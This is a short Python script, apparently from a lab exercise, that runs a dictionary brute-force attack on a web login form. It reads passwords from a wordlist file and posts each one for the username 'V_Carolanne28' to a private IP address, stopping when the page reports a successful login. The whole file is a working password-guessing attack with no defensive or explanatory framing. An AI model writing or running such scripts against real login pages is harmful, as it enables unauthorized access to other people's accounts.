import requests

f = open("Q2dictionary.txt","r")
passwords = f.read().splitlines()

url = 'http://172.16.48.80/'

for password in passwords:
    data= {'username': 'V_Carolanne28','password':password,'submit':'submit'}
    request = requests.post(url,data)

    if  "You Logged In" in str(request.content):

        print(password)
        break
    else:
        print("Failure")
